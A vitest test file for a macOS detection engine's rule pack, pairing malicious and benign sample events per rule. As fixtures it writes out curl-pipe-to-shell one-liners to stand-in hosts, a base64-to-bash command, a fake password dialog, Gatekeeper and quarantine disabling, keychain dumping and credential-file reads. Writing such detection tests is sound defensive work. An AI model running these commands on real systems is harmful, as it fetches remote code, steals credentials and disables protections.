import { describe, expect, it } from 'vitest';
import { DetectionEngine } from '../engine.js';
import { macosCoreRules } from '../packs/macos-core.js';
import { lintRule } from '../rules/lint.js';
import { memoryStores } from '../state/stores.js';
import { DetectionRule, type DetectionEvent } from '../types.js';
import {
  chrome,
  connect,
  ev,
  exec,
  fileOpen,
  osascriptTool,
  proc,
  shell,
  unsignedStealer,
} from './fixtures.js';

function engine() {
  const stores = memoryStores();
  const meta = { source: 'test', updatedAt: 0 };
  stores.lists.replace('known_bad_sha256', ['b'.repeat(64)], meta);
  stores.lists.replace('known_bad_domains', ['evil-c2.test'], meta);
  stores.lists.replace('known_bad_ips', ['203.0.113.0/24'], meta);
  stores.lists.replace('user_blocked_sha256', ['d'.repeat(64)], meta);
  return new DetectionEngine(macosCoreRules, stores);
}

const home = '/Users/alex';
const devTool = proc({ path: `${home}/code/app/target/debug/app`, signing: 'adhoc' });
const persist = (path: string, program: string, programArgs?: string[]) =>
  ev({
    kind: 'persistence',
    change: 'added',
    mechanism: 'launch_agent',
    path,
    program,
    ...(programArgs ? { programArgs } : {}),
  });
const write = (process: ReturnType<typeof proc>, path: string) =>
  ev({ kind: 'file', op: 'write', path, process });

/** What a malicious sample should produce: the effective mode and the actions it runs or offers. */
type Want = { mode: 'block' | 'alert' | 'shadow'; actions?: string[] };

/** For each rule: events that must trigger it and look-alikes that must not. */
const cases: Record<string, { bad: Array<[DetectionEvent, Want]>; good: DetectionEvent[] }> = {
  'known-bad-hash': {
    bad: [
      [
        exec(proc({ path: '/Applications/Free.app/Contents/MacOS/Free', sha256: 'b'.repeat(64) })),
        { mode: 'block', actions: ['process.kill', 'santa.rule.set'] },
      ],
    ],
    good: [exec(chrome)],
  },
  'user-blocked-hash': {
    bad: [
      [
        exec(proc({ path: '/Applications/X.app/Contents/MacOS/X', sha256: 'd'.repeat(64) })),
        { mode: 'block', actions: ['process.kill', 'santa.rule.set'] },
      ],
    ],
    good: [exec(chrome)],
  },
  'known-bad-destination': {
    bad: [[connect(devTool, '203.0.113.50'), { mode: 'block', actions: ['network.block'] }]],
    good: [
      connect(chrome, '142.250.1.1', 'google.com'),
      connect(chrome, '198.51.100.4', 'x.evil-c2.test'),
    ],
  },
  'known-bad-domain': {
    bad: [
      [
        connect(chrome, '198.51.100.4', 'x.evil-c2.test'),
        { mode: 'alert', actions: ['network.block'] },
      ],
    ],
    good: [connect(chrome, '142.250.1.1', 'google.com'), connect(devTool, '203.0.113.50')],
  },
  'credential-theft-untrusted': {
    bad: [
      [
        fileOpen(
          unsignedStealer,
          `${home}/Library/Application Support/Google/Chrome/Default/Login Data`,
        ),
        { mode: 'block', actions: ['process.suspend'] },
      ],
      [
        fileOpen(
          proc({ path: '/usr/bin/python3', ppid: 900, signing: 'apple' }),
          `${home}/Library/Application Support/Firefox/Profiles/ab12.default/logins.json`,
        ),
        { mode: 'block', actions: ['process.suspend'] },
      ],
      [
        fileOpen(
          unsignedStealer,
          `${home}/Library/Application Support/Google/Chrome/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn/000003.log`,
        ),
        { mode: 'block', actions: ['process.suspend'] },
      ],
      [
        fileOpen(proc({ path: '/usr/bin/curl', signing: 'apple' }), `${home}/.ssh/id_ed25519`),
        { mode: 'block', actions: ['process.suspend'] },
      ],
    ],
    good: [
      fileOpen(chrome, `${home}/Library/Application Support/Google/Chrome/Default/Cookies`),
      fileOpen(proc({ path: '/usr/bin/ssh', signing: 'apple' }), `${home}/.ssh/id_ed25519`),
      fileOpen(unsignedStealer, `${home}/.ssh/known_hosts`),
      // SSH keys are ssh-key-read-untrusted's, which alerts instead of blocking.
      fileOpen(unsignedStealer, `${home}/.ssh/id_ed25519`),
    ],
  },
  'ssh-key-read-untrusted': {
    bad: [
      [
        fileOpen(unsignedStealer, `${home}/.ssh/id_ed25519`),
        { mode: 'alert', actions: ['process.suspend'] },
      ],
      [
        fileOpen(
          proc({
            path: '/opt/homebrew/Cellar/python@3.12/3.12.4/bin/python3.12',
            signing: 'adhoc',
          }),
          `${home}/.ssh/id_rsa`,
        ),
        { mode: 'alert', actions: ['process.suspend'] },
      ],
    ],
    good: [
      fileOpen(proc({ path: '/usr/bin/ssh', signing: 'apple' }), `${home}/.ssh/id_ed25519`),
      fileOpen(unsignedStealer, `${home}/.ssh/known_hosts`),
      fileOpen(
        unsignedStealer,
        `${home}/Library/Application Support/Google/Chrome/Default/Cookies`,
      ),
    ],
  },
  'fake-password-prompt': {
    bad: [
      [
        exec(
          osascriptTool([
            '-e',
            'display dialog "macOS needs your password" default answer "" with hidden answer',
          ]),
        ),
        { mode: 'block', actions: ['process.kill'] },
      ],
    ],
    good: [exec(osascriptTool(['-e', 'display dialog "Backup finished"']))],
  },
  'tcc-database-tamper': {
    bad: [
      [
        write(unsignedStealer, `${home}/Library/Application Support/com.apple.TCC/TCC.db`),
        { mode: 'block', actions: ['process.suspend'] },
      ],
    ],
    good: [
      write(
        proc({
          path: '/System/Library/PrivateFrameworks/TCC.framework/Support/tccd',
          signing: 'apple',
        }),
        `${home}/Library/Application Support/com.apple.TCC/TCC.db`,
      ),
    ],
  },
  'santa-blocked-launch': {
    bad: [
      [
        ev({
          kind: 'santa.decision',
          source: 'santa',
          target: 'execution',
          decision: 'block',
          reason: 'BLOCK_BINARY',
          process: unsignedStealer,
        }),
        { mode: 'alert' },
      ],
    ],
    good: [
      ev({
        kind: 'santa.decision',
        source: 'santa',
        target: 'execution',
        decision: 'allow',
        reason: 'ALLOW_CERTIFICATE',
        process: chrome,
      }),
    ],
  },
  'santa-protected-file-access': {
    bad: [
      // Audit-only reads as the sensors report them now: file activity from Santa.
      [
        ev({
          kind: 'file',
          source: 'santa',
          op: 'open',
          path: `${home}/Library/Application Support/Google/Chrome/Default/Login Data`,
          process: proc({
            path: '/Applications/PDF Tools.app/Contents/MacOS/PDF Tools',
            signing: 'developer_id',
            teamId: 'ZZZ999ZZZ9',
          }),
        }),
        { mode: 'alert', actions: ['process.suspend'] },
      ],
      [
        ev({
          kind: 'file',
          source: 'santa',
          op: 'open',
          path: `${home}/Library/Application Support/Firefox/Profiles/ab12.default/logins.json`,
          process: { pid: 77, path: '/Users/Shared/.x/agent' },
        }),
        { mode: 'alert', actions: ['process.suspend'] },
      ],
      [
        ev({
          kind: 'santa.decision',
          source: 'santa',
          target: 'file_access',
          decision: 'audit_only',
          reason: 'Chrome passwords',
          path: `${home}/Library/Application Support/Google/Chrome/Default/Login Data`,
          process: unsignedStealer,
        }),
        { mode: 'alert', actions: ['process.suspend'] },
      ],
      [
        ev({
          kind: 'santa.decision',
          source: 'santa',
          target: 'file_access',
          decision: 'block',
          reason: 'SSH keys',
          path: `${home}/.ssh/id_ed25519`,
          process: devTool,
        }),
        { mode: 'alert', actions: ['process.suspend'] },
      ],
    ],
    good: [
      ev({
        kind: 'santa.decision',
        source: 'santa',
        target: 'file_access',
        decision: 'allow',
        reason: 'Chrome passwords',
        process: chrome,
      }),
      // Unsigned readers are credential-theft-untrusted's, so they alert once.
      ev({
        kind: 'file',
        source: 'santa',
        op: 'open',
        path: `${home}/Library/Application Support/Google/Chrome/Default/Login Data`,
        process: unsignedStealer,
      }),
      // The browser reading its own store.
      fileOpen(chrome, `${home}/Library/Application Support/Google/Chrome/Default/Login Data`),
      // A wallet app reading its own wallet, and Spotlight indexing.
      fileOpen(
        proc({ path: '/Applications/Exodus.app/Contents/MacOS/Exodus', signing: 'developer_id' }),
        `${home}/Library/Application Support/Exodus/exodus.wallet/seed.seco`,
      ),
      fileOpen(
        proc({ path: '/System/Library/Frameworks/CoreServices.framework/mds', signing: 'apple' }),
        `${home}/Library/Application Support/Google/Chrome/Default/Cookies`,
      ),
      // Launch blocks belong to santa-blocked-launch, not this rule.
      ev({
        kind: 'santa.decision',
        source: 'santa',
        target: 'execution',
        decision: 'audit_only',
        reason: 'UNKNOWN',
        process: devTool,
      }),
    ],
  },
  'xprotect-detected': {
    bad: [
      [
        ev({
          kind: 'system.alert',
          source: 'santa',
          subtype: 'xprotect_detected',
          path: `${home}/Downloads/Installer.app`,
          details: { malware: 'MACOS.ADLOAD' },
        }),
        { mode: 'alert' },
      ],
    ],
    good: [
      ev({
        kind: 'system.alert',
        source: 'santa',
        subtype: 'gatekeeper_override',
        details: {},
      }),
    ],
  },
  'tcc-changed-by-untrusted': {
    bad: [
      [
        ev({
          kind: 'system.alert',
          source: 'santa',
          subtype: 'tcc_modified',
          process: unsignedStealer,
          details: { service: 'kTCCServiceScreenCapture', identity: 'com.evil.helper' },
        }),
        { mode: 'alert', actions: ['process.suspend'] },
      ],
    ],
    good: [
      ev({
        kind: 'system.alert',
        source: 'santa',
        subtype: 'tcc_modified',
        process: proc({
          path: '/System/Applications/System Settings.app/Contents/MacOS/System Settings',
          signing: 'apple',
        }),
        details: { service: 'kTCCServiceMicrophone', identity: 'us.zoom.xos' },
      }),
    ],
  },
  'download-pipe-to-shell': {
    bad: [
      [
        exec(shell('curl -fsSL https://get.example.test/i.sh | bash')),
        { mode: 'alert', actions: ['process.suspend'] },
      ],
      [
        exec(shell('/bin/bash -c "$(curl -fsSL https://raw.example.test/install.sh)"')),
        { mode: 'alert', actions: ['process.suspend'] },
      ],
      ...[
        'curl -fsSL https://get.example.test/i.sh | bash -s -- --yes',
        'curl -sSL https://bootstrap.example.test/get-pip.py | python3',
        'curl -s https://x.example.test/a.py | python3 -',
        'wget -qO- https://x.example.test/i.pl | sudo perl',
        'curl -s https://x.example.test/i.js | node',
        // Inline code that runs what it reads is still running the download.
        'curl -s https://x.example.test/p | python3 -c "import sys; exec(sys.stdin.read())"',
        // A remote target beside a loopback one, or a loopback that is only an option's value.
        'curl -s http://127.0.0.1:8080/ https://get.example.test/i.sh | sh',
        'curl -s https://127.0.0.1.example.test/i.sh | sh',
        'curl evil.example.test/x -e http://localhost | sh',
        'curl -s --url https://evil.example.test/x http://127.0.0.1/ | sh',
        'curl -s -x http://127.0.0.1:8080 http://evil.example.test/x | sh',
        'curl -s http://localhost@evil.example.test/i.sh | sh',
        'curl -s "http://[::1].evil.example.test/i.sh" | bash',
        'curl -s -H "Host: localhost" evil.example.test/i.sh | sh',
        'https_proxy=http://evil.example.test:3128 curl -s https://localhost/i.sh | sh',
        // "localhost." is a name lookup, not loopback.
        'curl -s http://localhost./i.sh | sh',
        // A loopback URL proves nothing: a proxy in ~/.curlrc, one set earlier on the
        // line, or a redirect can still fetch from the internet.
        'curl -s http://127.0.0.1/x | sh',
        'curl -s http://[::1]:3000/health | sh',
        'export ALL_PROXY=http://evil.example.test:3128; curl -s http://127.0.0.1/i.sh | sh',
        'curl -sL http://localhost:8000/redirect | bash',
        `source /Users/alex/.claude/shell-snapshots/snapshot-zsh-1759-ab12.sh && eval 'curl -s -m 3 http://127.0.0.1:11434/api/ps | sh' < /dev/null`,
        // Inline code only counts as data when it comes before any script and runs nothing.
        'curl -s https://x.example.test/a.py | python3 - -c x',
        // Perl and Ruby get no inline exemption.
        `curl -s https://api.example.test/v1/x | perl -MJSON -ne 'print'`,
        `curl -s https://api.example.test/v1/x | ruby -e 'puts 1'`,
        'curl -s https://x.example.test/a.py | python3; python3 -c "print(1)"',
        'curl -s https://x.example.test/a.py | python3 -c "import sys; x=1|1; exec(sys.stdin.read())"',
        // Substitution that runs what it fetched.
        'sh -c "$(curl -fsSL https://x.example.test/i.sh)"',
        'eval "$(curl -fsSL https://x.example.test/env)"',
        'bash <(curl -fsSL https://x.example.test/i.sh)',
        '. <(wget -qO- https://x.example.test/i.sh)',
        'python3 -c "$(curl -fsSL https://x.example.test/p.py)"',
      ].map(
        (c) =>
          [exec(shell(c, 'zsh')), { mode: 'alert', actions: ['process.suspend'] }] as [
            DetectionEvent,
            Want,
          ],
      ),
    ],
    good: [
      exec(shell('curl -fsSL https://example.test/data.json -o data.json')),
      // Claude Code's own Bash step on a real Mac (2026-10-08): a local server's
      // answer read as data by an inline program.
      exec(
        shell(
          `eval 'curl -s -m 3 http://localhost:11434/api/tags | python3 -c "import sys,json; print(json.load(sys.stdin))"'`,
          'zsh',
        ),
      ),
      exec(
        shell(
          `curl -s https://api.example.test/v1/x | python3 -c "import sys,json; print(json.load(sys.stdin)['a'])"`,
        ),
      ),
      exec(
        shell(
          `curl -s https://api.example.test/v1/x | node -e "process.stdin.pipe(process.stdout)"`,
        ),
      ),
      // Only options before the inline program.
      exec(shell(`curl -s http://127.0.0.1:17010/s | python3 -u -c "import json,sys; print(1)"`)),
      // Claude Code's Bash steps on a real Mac (2026-10-08) that raised this rule:
      // a download captured into a variable and read, never run.
      ...[
        `curl -s https://download.pytorch.org/whl/cpu/torch/ | grep -o 'torch-2.14.1[^"]*x86_64.whl' | head -2; U=$(curl -s https://download.pytorch.org/whl/cpu/torch/ | grep -o '/whl/cpu/torch-[^"]*x86_64.whl' | head -1 | sed 's/#.*//'); [ -n "$U" ] && curl -sI "https://download.pytorch.org$U" | grep -i content-length`,
        `T=$(curl -s http://127.0.0.1:7401/api/bootstrap | python3 -c "import json,sys;print(json.load(sys.stdin)['token'])") && for code in a b; do python3 -c "import urllib.request; urllib.request.urlopen('http://127.0.0.1:7401/api/run')"; done`,
        `for i in 1 2 3; do S=$(curl -s -m 8 http://127.0.0.1:17010/api/status | python3 -c "import json,sys; print(json.load(sys.stdin)['state'])"); echo $S; sleep 2; done`,
        `for i in 1 2 3; do curl -s -m 8 http://127.0.0.1:11434/api/ps | python3 -c "import json,sys; d=json.load(sys.stdin); print([m['name'] for m in d.get('models',[])])"; sleep 2; done`,
      ].map((c) =>
        exec(
          shell(
            `source /Users/alex/.claude/shell-snapshots/snapshot-zsh-1759-ab12.sh && eval '${c.replace(/'/g, "'\\''")}' < /dev/null && pwd -P >| /var/folders/x/T/claude-ab12-cwd`,
            'zsh',
          ),
        ),
      ),
    ],
  },
  'base64-pipe-to-shell': {
    bad: [
      [
        exec(shell('echo Y3VybCBldmls | base64 -d | bash', 'zsh')),
        { mode: 'alert', actions: ['process.suspend'] },
      ],
    ],
    good: [exec(shell('echo aGk= | base64 -d > out.txt', 'zsh'))],
  },
  'unsigned-quarantined-exec': {
    bad: [
      [
        exec(
          proc({
            path: '/Volumes/Installer/Setup.app/Contents/MacOS/Setup',
            signing: 'adhoc',
            quarantine: { originUrl: 'https://cracked-apps.test/setup.dmg' },
          }),
        ),
        { mode: 'alert', actions: ['process.suspend', 'file.quarantine'] },
      ],
    ],
    good: [
      exec(
        proc({
          path: '/Applications/Zoom.app/Contents/MacOS/zoom.us',
          signing: 'developer_id',
          teamId: 'BJ4HAAB9B3',
          quarantine: { originUrl: 'https://zoom.us/' },
        }),
      ),
      exec(devTool),
    ],
  },
  'quarantine-removed': {
    bad: [
      [
        exec(
          proc({
            path: '/usr/bin/xattr',
            args: ['xattr', '-d', 'com.apple.quarantine', '/Applications/X.app'],
            signing: 'apple',
          }),
        ),
        { mode: 'alert' },
      ],
      [
        exec(
          proc({
            path: '/usr/bin/xattr',
            args: ['xattr', '-cr', '/Applications/Y.app'],
            signing: 'apple',
          }),
        ),
        { mode: 'alert' },
      ],
      [
        exec(
          proc({
            path: '/usr/bin/xattr',
            args: ['xattr', '-d', '-r', 'com.apple.quarantine', '/Applications/Google Chrome.app'],
            signing: 'apple',
          }),
        ),
        { mode: 'alert' },
      ],
      [
        exec(
          proc({
            path: '/usr/bin/xattr',
            args: ['xattr', '-r', '-d', 'com.apple.quarantine', '/Applications/X.app'],
            signing: 'apple',
          }),
        ),
        { mode: 'alert' },
      ],
      [
        exec(
          proc({
            path: '/usr/bin/xattr',
            args: ['xattr', '-dr', 'com.apple.quarantine', '/Applications/X.app'],
            signing: 'apple',
          }),
        ),
        { mode: 'alert' },
      ],
      [
        exec(
          proc({
            path: '/usr/bin/xattr',
            args: ['xattr', '-rd', 'com.apple.quarantine', '/Applications/X.app'],
            signing: 'apple',
          }),
        ),
        { mode: 'alert' },
      ],
      [
        exec(
          proc({
            path: '/usr/bin/xattr',
            args: ['xattr', '-c', '/Applications/X.app'],
            signing: 'apple',
          }),
        ),
        { mode: 'alert' },
      ],
      [
        exec(
          proc({
            path: '/usr/bin/xattr',
            args: ['xattr', '-rc', '/Applications/X.app'],
            signing: 'apple',
          }),
        ),
        { mode: 'alert' },
      ],
    ],
    good: [
      exec(proc({ path: '/usr/bin/xattr', args: ['xattr', '-l', 'file.txt'], signing: 'apple' })),
      // Real cases from Alex's Mac: Claude and Slack write the flag on downloads.
      exec(
        proc({
          path: '/usr/bin/xattr',
          args: [
            'xattr',
            '-w',
            'com.apple.quarantine',
            '0081;66f0a1b2;Claude;',
            '/Users/alex/Downloads/report.pdf',
          ],
          signing: 'apple',
        }),
      ),
      exec(
        proc({
          path: '/usr/bin/xattr',
          args: [
            'xattr',
            '-w',
            'com.apple.quarantine',
            '0081;66f0a1b2;Slack;',
            '/Users/alex/Downloads/notes.docx',
          ],
          signing: 'apple',
        }),
      ),
      exec(
        proc({
          path: '/usr/bin/xattr',
          args: ['xattr', '-p', 'com.apple.quarantine', '/Users/alex/Downloads/report.pdf'],
          signing: 'apple',
        }),
      ),
      exec(
        proc({
          path: '/usr/bin/xattr',
          args: [
            'xattr',
            '-d',
            'com.apple.metadata:kMDItemWhereFroms',
            '/Users/alex/Downloads/a.zip',
          ],
          signing: 'apple',
        }),
      ),
    ],
  },
  'gatekeeper-disabled': {
    bad: [
      [
        exec(
          proc({ path: '/usr/sbin/spctl', args: ['spctl', '--master-disable'], signing: 'apple' }),
        ),
        { mode: 'alert' },
      ],
    ],
    good: [exec(proc({ path: '/usr/sbin/spctl', args: ['spctl', '--status'], signing: 'apple' }))],
  },
  'keychain-dump': {
    bad: [
      [
        exec(
          proc({
            path: '/usr/bin/security',
            args: ['security', 'dump-keychain', '-d'],
            signing: 'apple',
          }),
        ),
        { mode: 'alert', actions: ['process.suspend'] },
      ],
    ],
    good: [
      exec(
        proc({
          path: '/usr/bin/security',
          args: ['security', 'find-certificate', '-a'],
          signing: 'apple',
        }),
      ),
    ],
  },
  'exec-from-shared-temp': {
    bad: [[exec(unsignedStealer), { mode: 'alert', actions: ['process.suspend'] }]],
    good: [
      exec(
        proc({
          path: '/private/tmp/brew-installer',
          signing: 'developer_id',
          teamId: 'ABCDE12345',
        }),
      ),
    ],
  },
  'persistence-suspicious-program': {
    bad: [
      [
        persist(`${home}/Library/LaunchAgents/com.update.plist`, '/Users/Shared/.upd'),
        { mode: 'alert', actions: ['persistence.disable'] },
      ],
      [
        persist(`${home}/Library/LaunchAgents/com.helper.plist`, '/bin/bash', [
          '/bin/bash',
          '-c',
          'curl -s https://x.test/p | sh',
        ]),
        { mode: 'alert', actions: ['persistence.disable'] },
      ],
    ],
    good: [
      persist(
        `${home}/Library/LaunchAgents/com.google.keystone.agent.plist`,
        `${home}/Library/Application Support/Google/GoogleUpdater/Current/GoogleUpdater.app/Contents/MacOS/GoogleUpdater`,
      ),
    ],
  },
  'persistence-apple-lookalike': {
    bad: [
      [
        persist(`${home}/Library/LaunchAgents/com.apple.updater.plist`, `${home}/.local/upd`),
        { mode: 'alert', actions: ['persistence.disable'] },
      ],
    ],
    good: [
      persist(
        '/System/Library/LaunchAgents/com.apple.Finder.plist',
        '/System/Library/CoreServices/Finder.app/Contents/MacOS/Finder',
      ),
    ],
  },
  'persistence-first-seen': {
    bad: [
      [
        persist(
          '/Library/LaunchDaemons/com.vendor.helper.plist',
          '/Library/PrivilegedHelperTools/com.vendor.helper',
        ),
        { mode: 'alert', actions: ['persistence.disable'] },
      ],
    ],
    good: [],
  },
  'new-network-listener': {
    bad: [
      [
        ev({
          kind: 'network.listen',
          protocol: 'tcp',
          localAddress: '0.0.0.0',
          localPort: 8080,
          process: devTool,
        }),
        { mode: 'alert' },
      ],
    ],
    good: [
      ev({
        kind: 'network.listen',
        protocol: 'tcp',
        localAddress: '127.0.0.1',
        localPort: 3000,
        process: devTool,
      }),
      ev({
        kind: 'network.listen',
        protocol: 'tcp',
        localAddress: '::',
        localPort: 49152,
        process: proc({ path: '/usr/libexec/rapportd', signing: 'apple' }),
      }),
    ],
  },
  'browser-extension-broad-access': {
    bad: [
      [
        ev({
          kind: 'browser.extension',
          change: 'added',
          browser: 'chrome',
          extensionId: 'abcdefghijklmnop',
          name: 'PDF Converter Pro',
          permissions: ['tabs', '<all_urls>'],
        }),
        { mode: 'alert' },
      ],
    ],
    good: [
      ev({
        kind: 'browser.extension',
        change: 'added',
        browser: 'chrome',
        extensionId: 'qrstuvwxyz',
        name: 'Dark Theme',
        permissions: ['storage'],
      }),
    ],
  },
  'mass-document-reads': { bad: [], good: [] },
  'untrusted-download-collect-then-connect': { bad: [], good: [] },
  'untrusted-download-persistence': {
    bad: [
      [
        ev({
          kind: 'persistence',
          change: 'added',
          mechanism: 'launch_agent',
          path: `${home}/Library/LaunchAgents/com.updater.plist`,
          program: '/bin/sh',
          process: proc({
            path: '/bin/sh',
            signing: 'apple',
            downloadedAncestor: {
              path: '/Volumes/Setup/Setup.app/Contents/MacOS/Setup',
              originUrl: 'https://files.example/setup.dmg',
              signing: 'adhoc',
            },
          }),
        }),
        { mode: 'alert', actions: ['persistence.disable'] },
      ],
    ],
    good: [
      // An identified app that was downloaded adds its own login item.
      ev({
        kind: 'persistence',
        change: 'added',
        mechanism: 'login_item',
        path: '/Applications/Rectangle.app',
        program: '/Applications/Rectangle.app/Contents/MacOS/Rectangle',
        process: proc({
          path: '/Applications/Rectangle.app/Contents/MacOS/Rectangle',
          signing: 'developer_id',
          quarantine: { originUrl: 'https://rectangleapp.com/Rectangle.dmg' },
        }),
      }),
    ],
  },
  'unsigned-first-network': {
    bad: [[connect(devTool, '140.82.112.3'), { mode: 'shadow' }]],
    good: [connect(chrome, '142.250.1.1')],
  },
};

describe('macOS core pack', () => {
  it('has a test case for every rule', () => {
    expect(Object.keys(cases).sort()).toEqual(macosCoreRules.map((r) => r.id).sort());
  });

  it('passes the linter with no errors or warnings', () => {
    for (const r of macosCoreRules) {
      const res = lintRule(DetectionRule.parse(r));
      expect([...res.errors, ...res.warnings], r.id).toEqual([]);
    }
  });

  it('only blocks with high-fidelity rules out of the box', () => {
    const blocking = macosCoreRules.filter((r) => r.mode === 'block');
    expect(blocking.map((r) => r.id).sort()).toEqual(
      [
        'credential-theft-untrusted',
        'fake-password-prompt',
        'known-bad-destination',
        'known-bad-hash',
        'tcc-database-tamper',
        'user-blocked-hash',
      ].sort(),
    );
    expect(blocking.every((r) => r.fidelity === 'high')).toBe(true);
  });

  for (const [id, c] of Object.entries(cases)) {
    for (const [i, [e, want]] of c.bad.entries()) {
      it(`${id} fires on malicious sample ${i + 1}`, () => {
        const d = engine()
          .evaluate(e)
          .find((x) => x.match.ruleId === id);
        expect(d, JSON.stringify(e)).toBeDefined();
        expect(d!.mode).toBe(want.mode);
        const acted = [...d!.execute, ...d!.propose].map((a) => a.kind);
        expect(acted).toEqual(want.actions ?? []);
        expect(d!.reasons.join(' ')).not.toMatch(/\{\{|unknown/);
        if (want.mode !== 'shadow') expect(d!.alert?.summary).toBe(d!.reasons.join(' '));
      });
    }
    for (const [i, e] of c.good.entries()) {
      it(`${id} stays quiet on benign sample ${i + 1}`, () => {
        expect(
          engine()
            .evaluate(e)
            .map((x) => x.match.ruleId),
        ).not.toContain(id);
      });
    }
  }

  it('untrusted-download-collect-then-connect needs the read, then a connection, from the same download', () => {
    const download = {
      path: '/Volumes/Game/Game.app/Contents/MacOS/Game',
      originUrl: 'https://cracks.example/game.dmg',
      signing: 'unsigned' as const,
    };
    const child = (path: string, pid: number) =>
      proc({ path, pid, signing: 'apple', downloadedAncestor: download });
    const cookies = `${home}/Library/Application Support/Google/Chrome/Default/Cookies`;
    const fired = (events: DetectionEvent[]) => {
      const eng = engine();
      return events
        .flatMap((e) => eng.evaluate(e))
        .filter((d) => d.match.ruleId === 'untrusted-download-collect-then-connect');
    };
    // Read by one child, sent by another: same download, so it fires.
    const hits = fired([
      fileOpen(child('/bin/cp', 601), cookies),
      connect(child('/usr/bin/curl', 602), '198.51.100.7'),
    ]);
    expect(hits).toHaveLength(1);
    expect(hits[0]!.mode).toBe('alert');
    expect(hits[0]!.propose.map((a) => a.kind)).toEqual(['network.block', 'process.kill']);
    expect(hits[0]!.reasons.join(' ')).not.toMatch(/\{\{|unknown/);
    // A connection alone, or one before the read, is not enough.
    expect(fired([connect(child('/usr/bin/curl', 602), '198.51.100.7')])).toEqual([]);
    expect(
      fired([
        connect(child('/usr/bin/curl', 602), '198.51.100.7'),
        fileOpen(child('/bin/cp', 601), cookies),
      ]),
    ).toEqual([]);
    // A different download connecting does not count.
    expect(
      fired([
        fileOpen(child('/bin/cp', 601), cookies),
        connect(
          proc({
            path: '/usr/bin/curl',
            signing: 'apple',
            downloadedAncestor: { ...download, path: '/Volumes/Other/Other' },
          }),
          '198.51.100.7',
        ),
      ]),
    ).toEqual([]);
    // An identified downloaded app (Chrome) reading its own cookies then connecting is normal.
    const chromeDownloaded = proc({
      ...chrome,
      quarantine: { originUrl: 'https://dl.google.com/chrome.dmg' },
    });
    expect(
      fired([fileOpen(chromeDownloaded, cookies), connect(chromeDownloaded, '142.250.1.1')]),
    ).toEqual([]);
  });

  it('chain rules forget steps older than their window', () => {
    const download = { path: '/Volumes/X/X', signing: 'unsigned' as const };
    const p = proc({ path: '/bin/cp', signing: 'apple', downloadedAncestor: download });
    const eng = engine();
    const read = fileOpen(p, `${home}/Library/Keychains/login.keychain-db`);
    eng.evaluate(read);
    const late = { ...connect(p, '198.51.100.7'), ts: read.ts + 11 * 60_000 } as DetectionEvent;
    expect(
      eng
        .evaluate(late)
        .filter((d) => d.match.ruleId === 'untrusted-download-collect-then-connect'),
    ).toEqual([]);
  });

  it('mass-document-reads needs 50 reads in a minute from one unsigned process', () => {
    const count = (p: ReturnType<typeof proc>) => {
      const eng = engine();
      let fired = 0;
      for (let i = 0; i < 60; i++) {
        const ds = eng.evaluate(fileOpen(p, `/Users/alex/Documents/f${i}.pdf`));
        fired += ds.filter((d) => d.match.ruleId === 'mass-document-reads').length;
      }
      return fired;
    };
    // Fixture events are one second apart, so 50 fall inside the minute.
    expect(count(unsignedStealer)).toBe(1);
    expect(count(chrome)).toBe(0);
  });

  it('an ordinary session produces no alerts', () => {
    const eng = engine();
    const events = [
      exec(chrome),
      fileOpen(chrome, '/Users/alex/Library/Application Support/Google/Chrome/Default/Cookies'),
      connect(chrome, '142.250.1.1', 'google.com'),
      exec(shell('git status')),
      exec(proc({ path: '/usr/bin/ssh', args: ['ssh', 'host'], signing: 'apple' })),
    ];
    expect(events.flatMap((e) => eng.evaluate(e)).filter((d) => d.alert)).toEqual([]);
  });

  it('never kills Apple-signed script tools started by launchd, even on a credential read', () => {
    const d = engine()
      .evaluate(
        fileOpen(
          proc({ path: '/usr/bin/python3', ppid: 1, signing: 'apple' }),
          `${home}/Library/Keychains/login.keychain-db`,
        ),
      )
      .find((x) => x.match.ruleId === 'credential-theft-untrusted')!;
    expect(d.execute).toEqual([]);
    expect(d.mode).toBe('alert');
  });
});
